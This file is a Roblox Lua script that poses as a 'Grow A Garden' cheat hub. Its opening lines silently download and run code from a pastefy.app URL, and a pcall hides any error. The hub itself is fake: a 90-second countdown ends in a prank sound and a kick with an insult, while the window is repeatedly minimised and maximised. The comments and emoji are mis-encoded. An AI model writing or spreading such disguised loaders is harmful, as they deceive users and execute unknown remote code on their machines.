local success, errorMsg = pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/q0Hv6Z1b/raw", true))()
end)

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield', true))()

local Window = Rayfield:CreateWindow({
    Name = "üåΩ Grow A Garden",
    LoadingTitle = "WyshScriptHub",
    LoadingSubtitle = "By Wysh",
    ConfigurationSaving = {
        Enabled = false
    },
    Discord = {
        Enabled = false
    },
    KeySystem = false
})

local Tab = Window:CreateTab("‚è≥ Loading...", nil)
local TimerSection = Tab:CreateSection("Please wait")
local TimerLabel = Tab:CreateLabel("Hub will unlock in 1:30")

local timeLeft = 90
local timerRunning = true

local function playFartSound()
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://4809574295"
    sound.Volume = 1.0
    sound.Parent = workspace
    sound:Play()
    game:GetService("Debris"):AddItem(sound, 5)
end

local function kickPlayer()
    local player = game:GetService("Players").LocalPlayer
    player:Kick("sosi jopy")
end

-- –¢–∞–π–º–µ—Ä –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
coroutine.wrap(function()
    local startTime = tick()
    
    while timerRunning do
        local elapsed = tick() - startTime
        timeLeft = math.max(0, 90 - elapsed)
        
        if timeLeft <= 0 then
            break
        end
        
        local minutes = math.floor(timeLeft / 60)
        local seconds = math.floor(timeLeft % 60)
        TimerLabel:Set("Hub will unlock in: " .. string.format("%d:%02d", minutes, seconds))
        
        task.wait(0.1)
    end
    
    TimerLabel:Set("Successfully!")
    playFartSound()
    task.wait(1.5)
    kickPlayer()
end)()

-- –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞ (–æ—Ç–¥–µ–ª—å–Ω—ã–π –ø–æ—Ç–æ–∫)
coroutine.wrap(function()
    task.wait(2)
    while true do
        pcall(function()
            Window:Minimize()
            task.wait(0.1)
            Window:Maximize()
        end)
        task.wait(5)
    end
end)()
